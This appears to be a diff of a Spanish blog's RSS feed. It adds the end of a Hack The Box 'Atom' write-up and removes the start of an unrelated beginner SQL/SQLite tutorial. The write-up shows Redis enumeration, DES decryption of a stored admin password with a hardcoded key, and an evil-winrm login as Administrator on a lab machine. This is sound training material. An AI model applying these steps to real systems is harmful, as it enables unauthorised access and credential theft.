+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
+kidvscat_yes_kidvscat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de &lt;code&gt;RedisServer&lt;/code&gt;, asi que podemos tratar de conectarnos al servicio de &lt;code&gt;redis&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ redis-cli -h 10.10.10.237
+10.10.10.237:6379&amp;gt; auth kidvscat_yes_kidvscat
+OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Para poder enumerar el servicio podemos apoyarnos de &lt;code&gt;hacktricks&lt;/code&gt;, te dejo el recurso aqui:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&quot;&gt;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Podemos listar las KEYS disponibles y listar&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;10.10.10.237:6379&amp;gt; KEYS *
+1) &quot;pk:ids:User&quot;
+2) &quot;pk:ids:MetaDataClass&quot;
+3) &quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;
+4) &quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;
+10.10.10.237:6379&amp;gt; GET pk:ids:User
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+10.10.10.237:6379&amp;gt; GET pk:ids:MetaDataClass
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+10.10.10.237:6379&amp;gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+&quot;{\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253}&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Obtenemos una contraseña enctryptada &lt;code&gt;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&lt;/code&gt; con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'
+
+hash = base64.b64decode(hash.encode('utf-8'))
+key = DesKey(b&quot;7ly6UznJ&quot;)
+print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ejectamos nuevamente el exploit y obtenemos una nueva contraseña.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
+kidvscat_admin_@123
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podemos a intentar con esta nueva conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt; usando &lt;code&gt;winrm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
+atom\administrator
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd C:\Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         8/10/2023   5:27 PM             34 root.txt
+
+
+Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
+f55c47e3b749e8ae956f980fba1dc782
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Atom</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Atom</guid>
+        
+        <category>SMB Enumeration</category>
+        
+        <category>Abusing electron updater</category>
+        
+        <category>Signature Validation Bypass RCE</category>
+        
+        <category>Abusing PortableKanban</category>
+        
+        <category>Redis Enumeration</category>
+        
+        <category>Abusing WinRM</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Europa - htb writeup</title>
@@ -5474,1446 +6065,6 @@ echo &quot;g3tPr1v&quot; &amp;gt; /dev/ttyR0; whoami
         
         
         <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Aprende SQL desde cero y dominalo como un experto</title>
-        <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programación mas utilizado del mundo, exacto me refiero a &lt;code&gt;SQL&lt;/code&gt;, realizaremos todo un curso completo desde cero y explicaremos todo lo necesario para que puedas dominarlo en su totalidad, asi que comenzemos ya que debes aprenderlo ahora mismo!.&lt;/p&gt;
-
-&lt;h2 id=&quot;que-es-sql&quot;&gt;QUE ES SQL? &lt;a href=&quot;#que-es-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como mencionamos anteriormente &lt;code&gt;SQL&lt;/code&gt; es un lenguaje de programación, como?, si es un lenguaje de programación y nos sirve para almacenar y procesar información en una base de datos relacional.&lt;/p&gt;
-
-&lt;p&gt;Pero que es una base de datos relaciona?&lt;/p&gt;
-
-&lt;p&gt;Pues una base de datos relacional almacena información en forma de tabla, con filas y columnas que representan diferentes atributos de datos y las diversas relaciones entre los valores de datos.&lt;/p&gt;
-
-&lt;h2 id=&quot;aprender-sql&quot;&gt;POR QUE DEBO APRENDER SQL? &lt;a href=&quot;#aprender-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es necesario aprenderlo ya que es un lenguaje de consulta popular que se usa con frecuencia en todos los tipos de aplicaciones. Los analistas y desarrolladores de datos aprenden y usan &lt;code&gt;SQL&lt;/code&gt; porque se integra bien con los diferentes lenguajes de programación.&lt;/p&gt;
-
-&lt;h2 id=&quot;indice-y-estructura&quot;&gt;INDICE Y ESTRUCTURA&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;#que-es-sql&quot;&gt;Que es SQL&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#aprender-sql&quot;&gt;Por que debo aprender SQL?&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;Tipos de Bases de datos SQL &lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instalación&quot;&gt;Instalación&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#crear-base-de-datos&quot;&gt;Crear Base de Datos - CREATE DATABASE&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#crear-tabla&quot;&gt;Crear Tabla - CREATE TABLE&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#campos&quot;&gt;Campos&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#registros&quot;&gt;Registros&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#valor-de-campo&quot;&gt;Valor de Campo&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#columnas&quot;&gt;Columnas&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;Insertar Valores en Tabla - INSERT INTO&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#consultas-o-querys&quot;&gt;Consultas o Querys&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instruccion-select&quot;&gt;Instrucción SELECT&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#modificar-tabla-alter-table&quot;&gt;Modificar Tabla - ALTER TABLE&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#renombrar-tabla&quot;&gt;Renombrar Tabla&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#renombrar-columna&quot;&gt;Renombrar Columna&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#agregar-columna&quot;&gt;Agregar Columna&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#eliminar-columna&quot;&gt;Eliminar Columna&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instruccion-drop&quot;&gt;Instrucción DROP&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#eliminar-base-de-datos-drop-database&quot;&gt;Eliminar Base de Datos - DROP DATABASE&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#eliminar-tabla-drop-table&quot;&gt;Eliminar Tabla - DROP TABLE&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#identificadores&quot;&gt;Identificadores&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#claves-primarias-o-primary-keys&quot;&gt;Claves Primarias - PRIMARY KEYS&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instruccion-delete&quot;&gt;Instrucción DELETE&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#claves-foraneas-o-foreign-keys&quot;&gt;Claves Foraneas - FOREIGN KEYS&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-as-o-alias&quot;&gt;Clausula AS o ALIAS&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-order-by&quot;&gt;Clausula ORDER BY&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-where&quot;&gt;Clausula WHERE&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#instruccion-update&quot;&gt;Instrucción UPDATE&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#operadores-en-sql&quot;&gt;Operadores en SQL&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#operadores-and-y-or&quot;&gt;Operadores AND Y OR&lt;/a&gt;
-        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#operador-and&quot;&gt;Operador AND&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#operador-or&quot;&gt;Operador OR&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-not&quot;&gt;Operador NOT&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-limit&quot;&gt;Operador LIMIT&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-distinct&quot;&gt;Operador DISTINCT&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador BETWEEN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-between&quot;&gt;Operador LIKE&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-is-null-y-is-not-null&quot;&gt;Operador IS NULL y IS NOT NULL&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#operador-in-y-not-in&quot;&gt;Operador IN y NOT IN&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#comentarios-en-sql&quot;&gt;Comentario en SQL&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#comentar-una-linea&quot;&gt;Comentar una linea&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#comentar-varias-lineas&quot;&gt;Comentar varias lineas&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#funciones-de-agregacion&quot;&gt;Funciones de Agregación&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-sum&quot;&gt;Función SUM&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-count&quot;&gt;Función COUNT&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-min&quot;&gt;Sentencia MIN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-max&quot;&gt;Sentencia MAX&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-avg&quot;&gt;Sentencia AVG&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#funcion-round&quot;&gt;Sentencia ROUND&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-group-by&quot;&gt;Clausula GROUP BY&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-having&quot;&gt;Clausula HAVING&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#subconsultas&quot;&gt;Subconsultas&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#joins&quot;&gt;JOINS&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#cross-join&quot;&gt;CROSS JOIN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#inner-join&quot;&gt;INNER JOIN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#left-join&quot;&gt;LEFT JOIN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#right-join&quot;&gt;RIGHT JOIN&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#full-join&quot;&gt;FULL JOIN&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-union&quot;&gt;Clausula UNION&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#clausula-union-all&quot;&gt;Clausula UNION ALL&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#indices&quot;&gt;Indices&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#indices-ordinarios-index&quot;&gt;Indices Ordinarios - INDEX&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#indices-primarios-primary-keys&quot;&gt;Indices Primarios - Primary Keys&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#indices-unicos-unique-index&quot;&gt;Indices Unicos - UNIQUE INDEX&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#vistas&quot;&gt;Vistas&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#bloqueos&quot;&gt;Bloqueos&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#bloqueos-compartidos-shared-locks&quot;&gt;Bloqueos Compartidos - SHARED LOCKS&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#bloqueos-reservados-reserved-locks&quot;&gt;Bloqueos Reservados - RESERVED LOCKS&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#bloqueos-exclusivos-exclusive-locks&quot;&gt;Bloqueos Exclusivos - EXCLUSIVE LOCKS&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#transacciones-begin-transaction&quot;&gt;Transacciones - BEGIN TRANSACTION&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#procedimientos-almacenados&quot;&gt;Procedimientos Almancenados&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#sql-y-python&quot;&gt;SQL y Python&lt;/a&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#funciones-definidas-por-el-usuario&quot;&gt;Funciones Definidas por el Usuario - USER DEFINED FUNCTIONS&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;tipos-de-datos-sql&quot;&gt;TIPOS DE BASES DE DATOS SQL &lt;a href=&quot;#tipos-de-datos-sql&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Existen muchos tipos de gestores de bases de datos sql, pero afortunadamente, la mayoría son muy parecidos y la lógica es la misma. Tienen alguna que otra sentencia diferente, pero por lo general, aprender un tipo de SQL te permitirá manejar cualquiera de las otras.&lt;/p&gt;
-
-&lt;p&gt;En este caso concreto para el curso usaremos &lt;code&gt;Sqlite&lt;/code&gt; ya que este es el gestor de uso mas comun y es compatible con muchos lenguajes de programación y ademas no tiene servidor de base da datos dedicado para poder ejecutarlo y esta integrado directamente con la aplicación lo que nos facilita su uso.&lt;/p&gt;
-
-&lt;h2 id=&quot;instalación&quot;&gt;INSTALACIÓN &lt;a href=&quot;#instalación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;La instalación es super sencilla solo debemos ir a la pagina oficial de sqlite para ello aqui dejo el enlace:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.sqlite.org/download.html&quot;&gt;https://www.sqlite.org/download.html&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para este caso ya que lo instalación lo hare en &lt;code&gt;windows&lt;/code&gt;, una vez estemos en el enlace debemos descargarnos el archivo de nombre &lt;code&gt;sqlite-tools-win32-x86-3420000.zip&lt;/code&gt;. Seguidamente lo descomprimimos y copiamos el contenido en una carpeta creada en la raiz de nuestro disco &lt;code&gt;C:&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Seguidamente lo que haremos sera ir a nuestro buscador y buscar &lt;code&gt;Editar las variables del Entorno del Sistema&lt;/code&gt; y se nos abrira la siguente ventana:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora debemos darle a &lt;code&gt;Variables de Entorno &amp;gt; Path &amp;gt; Editar &amp;gt; Nuevo&lt;/code&gt;  y pegaremos la ruta de nuestra carpeta donde descomprimimos los archivos y guardamos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues iremos al siguente enlace y descargemos &lt;code&gt;DB Browser for SQLite - Standard installer&lt;/code&gt;, dependiendo la version de windows que utilizamos &lt;code&gt;32 o 64 bits&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://sqlitebrowser.org/dl/&quot;&gt;https://sqlitebrowser.org/dl/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Finalmente solo debemos seguir los pasos simples de instalación:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y ya tendriamos &lt;code&gt;sqlite&lt;/code&gt; listo para usarlo, damos click en el &lt;code&gt;dbBrowser&lt;/code&gt; y se nos abrira la ventana donde vamos a trabajar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;crear-base-de-datos&quot;&gt;CREAR BASE DE DATOS - CREATE DATABASE &lt;a href=&quot;#crear-base-de-datos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para comenzar a crear nuestra primera base de datos en &lt;code&gt;sqlite&lt;/code&gt;, podemos hacerlo de dos maneras:&lt;/p&gt;
-
-&lt;p&gt;La primera seria simplemente ejecutar la palabra reservada &lt;code&gt;CREATE DATABASE&lt;/code&gt; y seguidamente el nombre que queremos que tenga nuestra base de datos, en este caso &lt;code&gt;Alumnos&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE DATABASE Alumnos;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Pero para reprensentarlo de una manera mas visible podemos hacerlo ejecutando en la opcion &lt;code&gt;New Database&lt;/code&gt; y le asignamos un nombre, en este caso valga la redundancia &lt;code&gt;Alumnos.db&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al darle en &lt;code&gt;Gudardar&lt;/code&gt;, automaticamente se nos abrira otra ventana, donde nos pide ingresar un campo de nombre &lt;code&gt;Table&lt;/code&gt;, para ello tenemos que primer tener en cuenta el concepto de &lt;code&gt;tabla&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;crear-tabla&quot;&gt;CREAR TABLA - CREATE TABLE &lt;a href=&quot;#crear-tabla&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Es una estructura de datos que se almancenan en &lt;code&gt;filas y columnas&lt;/code&gt; y estas obviamente deben de tener un nombre.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para poder crearlas debemos ejecutar la siguente consulta:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;CREATE TABLE &quot;Alumnos&quot; (
-
-);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;campos&quot;&gt;CAMPOS &lt;a href=&quot;#campos&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Las tablas a su vez tienen &lt;code&gt;campos&lt;/code&gt;, los cuales corresponden a los nombres de las columnas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;registros&quot;&gt;REGISTROS &lt;a href=&quot;#registros&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ademas de contener &lt;code&gt;campos&lt;/code&gt;, tambien contienen &lt;code&gt;registros&lt;/code&gt; que vendrian a ser cada una de las filas de las tablas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;valor-de-campo&quot;&gt;VALOR DE CAMPO &lt;a href=&quot;#valor-de-campo&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Vendria a ser cada uno de los valores de la interseccion entre los &lt;code&gt;campos&lt;/code&gt; y los &lt;code&gt;registros&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/tab4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;columnas&quot;&gt;COLUMNAS &lt;a href=&quot;#columnas&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Anteriormente realizamos la creación de una tabla, pero esta no nos serviria sin antes crear los campos o nombres de las columnas, para ello debemos crear los campos que necesitemos segun el tipo de dato que sera almacenado.&lt;/p&gt;
-
-&lt;p&gt;Si lo hacemos de manera grafica debemos seleccionar la opcion &lt;code&gt;Add&lt;/code&gt; y en &lt;code&gt;Name&lt;/code&gt; le indicaremos el nombre que tendra nuestro campo, seguidamente en &lt;code&gt;Type&lt;/code&gt; debemos indicar el tipo de dato el cual sera almacenado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En &lt;code&gt;sqlite&lt;/code&gt; existen 5 tipos de datos que podemos usar, estos se corresponden a:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code&gt;INTEGER:&lt;/code&gt; Almacenan valores de tipos de datos enteros.&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;TEXT:&lt;/code&gt; Almancenan valores de cadenas de texto.&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;BLOB:&lt;/code&gt; Almacena datos binarios, como fotos, videos entre otros.&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;REAL:&lt;/code&gt; Almacena numeros flotantes o valores con &lt;code&gt;,&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;&lt;code&gt;NUMERIC:&lt;/code&gt; Almacena numeros que necesitan un calculo matematico preciso, no tienen limites a diferencia que real.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;En base a lo previamente mencionado crearemos 3 campos en nuestra tabla, que correspondera a el &lt;code&gt;Nombre , Apellido y la edad&lt;/code&gt;. Haciendolo de manera grafica con el gestor solo tendriamos que agregar mas campos con &lt;code&gt;add&lt;/code&gt; y si nos percatamos en la parte de abajo se nos muestra el codigo que deberiamos ejecutar si queremos ejecutar para hacer el mismo proceso mediante una &lt;code&gt;consulta&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-06-20-Sql/sql8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Con esto ya tendriamos una base de datos creada con nuestra tabla &lt;code&gt;Alumnos&lt;/code&gt;, lo siguiente seria insertar registros en nuestra tabla, ya que por el momento esta se encuentra vacia.&lt;/p&gt;
-
-&lt;h2 id=&quot;insertar-valores-en-tabla-insert-into&quot;&gt;INSERTAR VALORES EN TABLA - INSERT INTO &lt;a href=&quot;#insertar-valores-en-tabla-insert-into&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Para poder insertar valores nos vamos al apartado de &lt;code&gt;Execute SQL&lt;/code&gt;. Una vez ahi para añadir valores dentro de nuestra tabla debemos hacer uso de la palabra reservada &lt;code&gt;INSERT INTO&lt;/code&gt;, y especificar el nombre de la tabla en este caso &lt;code&gt;Alumnos&lt;/code&gt; , abrimos &lt;code&gt;()&lt;/code&gt; y digitamos el nombre de los campos , seguidamente usamos la palabra &lt;code&gt;VALUES&lt;/code&gt; y de igual manera en &lt;code&gt;()&lt;/code&gt; los valores que queremos insertar.&lt;/p&gt;
-
-&lt;p&gt;Ahora para correr nuestra &lt;code&gt;query&lt;/code&gt; solo debemos darle click a el boton &lt;code&gt;run&lt;/code&gt; o presionar la combinacion de teclas &lt;code&gt;CTRL + ENTER&lt;/code&gt;&lt;/p&gt;
-
